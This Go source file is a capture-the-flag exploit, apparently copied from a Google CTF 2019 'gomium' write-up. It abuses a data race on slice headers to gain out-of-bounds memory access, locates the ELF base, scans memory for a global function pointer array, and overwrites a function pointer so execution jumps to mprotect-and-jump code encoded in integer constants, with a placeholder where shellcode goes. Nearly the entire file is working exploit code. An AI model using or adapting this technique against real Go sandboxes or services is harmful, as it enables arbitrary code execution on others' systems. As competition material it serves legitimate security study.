package main

// copy&paste from https://github.com/A-0-E/writeups/blob/master/googlectf-2019-finals/gomium/exp.go
func runsc(sc string) []int {
    // mprotect and jmp to sc
    // encoded in immediate values
    x0 := 0x05eb909090909090
    x1 := 0x06eb9008247c8b48
    x2 := 0x06eb90900cefc148
    x3 := 0x06eb90900ce7c148
    x4 := 0x06eb9000001000be
    x5 := 0x06eb9000000007ba
    x6 := 0x06eb900000000ab8
    x7 := 0x0000082464ff050f
    return []int{x0,x1,x2,x3,x4,x5,x6,x7}
}

type fptr struct {
    f func(sc string) []int
}

var win bool = false

var g_func_ptr_arr [0x20]*fptr

var oob_ptr [0x20]*[]uint64

var i, j uint64

func main() {
    // slice race, credit to hama
    func_ptr := new(fptr)
    func_ptr.f = runsc
    long := make([]*uint64, 8)
    short := make([]*uint64, 4)
    target := make([]*uint64, 4)
    oob := make([]uint64, 4)
    str := "hogehogehogehoge"
    oob[0] = 0xdeadbeef
    for i = 0; i < 0x20; i++ {
        oob_ptr[i] = &oob
        g_func_ptr_arr[i] = func_ptr
    }

    var hoge uint64 = 0xdeadbeefdeadbeef

    println("long", &long)
    println("short", &short)
    println("target", &target)
    println("oob", &oob)
    println("func_ptr", &func_ptr)
    println("str", &str)
    println("runsc", runsc)
    println("hoge", &hoge)

    confused := short
    go func() {
        for win == false {
            confused = long
            func() {
                if i >= 0 {
                    return
                }
                println(confused)
                println(target)
            }()
            confused = short
            i++
        }
    }()

    g := func() {
        confused[5] = &hoge
        confused[6] = &hoge
        if len(target) > 0x10 {
            win = true
            return
        }
    }

    f := func() {
        defer func() {
            if r := recover(); r != nil {
            }
        }()
        g()
    }
    for win == false {
        f()
    }

    target[5] = &i 
    target[6] = &j 
    println("target len", len(target))
    println("oob len", len(oob))

    leak := oob[6]-1
    target[4] = nil

    for i = 0; i < 0x1337; i++ {
        if oob[(leak)/8] == 0x00010102464c457f {
            break
        }
        leak = leak - 0x1000
    }
    println("elf base", leak) // base

    // parse elf
    e_phoff     := oob[leak/8+0x20/8]
    e_phentsize := oob[leak/8+0x30/8] >> 48 & 0xffff
    e_phnum     := oob[leak/8+0x38/8] & 0xffff
    var data, data_size, text_size uint64

    for i = 0; i < e_phnum; i++ {
        header  := leak + e_phoff + i * e_phentsize
        p_type  := oob[header/8] & 0xffffffff
        p_flags := oob[header/8] >> 32 & 0xffffffff
        p_vaddr := oob[header/8+0x10/8]
        p_memsz := oob[header/8+0x28/8]

        if(p_type == 1 && p_flags == 6) { //PT_LOAD, PF_Read_Write
            data = leak + p_vaddr
            data_size = p_memsz
        } else if(p_type == 1 && p_flags == 5) { //PT_LOAD, PF_Read_exec
            text_size = p_memsz
            text_size = text_size
        }
    }

    for i = 0; i < data_size/8; i++ {
        tmp := oob[data/8+i]
        if tmp != 0 && tmp > 0xc000000000 && tmp < 0xc000000000 + 0x1000000{
            cnt := 0
            for j = 1; j < 0x20; j++ {
                if (oob[data/8+i+j] == tmp) {
                    cnt++
                } else {
                    break
                }
            }
            if cnt == 0x20-1 {
                break
            }
        }
    }
    if i < data_size/8 {
        println("found!")
    } else {
        println("._.")
    }

    //search memory to get `global function pointer array address`
    gfpa_addr := data + i*8
    runsc_addr := oob[oob[oob[gfpa_addr/8]/8]/8]

    data = gfpa_addr + 0x20*8
    for i = 0; i < data_size/8; i++ {
        tmp := oob[data/8+i]
        if tmp != 0 && tmp > 0xc000000000 && tmp < 0xc000000000 + 0x1000000 {
            cnt := 0
            for j = 1; j < 0x20; j++ {
                if (oob[data/8+i+j] == tmp) {
                    cnt++
                } else {
                    break
                }
            }
            if cnt == 0x20-1 {
                break
            }
        }
    }
    if i < data_size/8 {
        println("found2!")
    } else {
        println("._.")
    }

    //search gadget, maybe unnecessary
    oob_addr := oob[data/8+i]
    oob[oob_addr/8+1] = 0x7fffffffffffffff
    oob[oob_addr/8+2] = 0x7fffffffffffffff

    for i = 0 ; i < 0x100; i++ {
        target[4] = nil
        oob[oob_addr/8] = runsc_addr + i
        if oob[0] == 0x05eb909090909090 {
            break
        }
    } 
    target[4] = nil
    if i < 0x100 {
        println("found3!")
    } else {
        println("._.")
    }

    //overwrite function pointer
    oob[gfpa_addr/8]   = gfpa_addr + 8
    oob[gfpa_addr/8+1] = gfpa_addr + 16
    oob[gfpa_addr/8+2] = runsc_addr + i

    sc := "shellcode here"

    g_func_ptr_arr[0].f(sc)
}
